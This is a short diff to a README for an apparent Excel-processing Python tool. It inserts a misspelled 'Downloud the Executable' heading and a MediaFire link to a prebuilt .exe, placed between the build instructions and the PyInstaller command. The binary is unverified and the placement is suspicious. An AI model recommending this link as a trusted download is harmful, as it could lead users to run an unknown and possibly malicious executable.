@@ -59,6 +59,11 @@ Here’s an example of how the process works:
 
 If you'd like to build the executable yourself, use PyInstaller with the following command:
 
+## Downloud the Executable
+https://www.mediafire.com/file/92oar099dbgchri/excel_processor.exe/file
+
+
+
 ```bash
 pyinstaller --onefile --icon="your_icon.ico" excel_processor.py
 ```
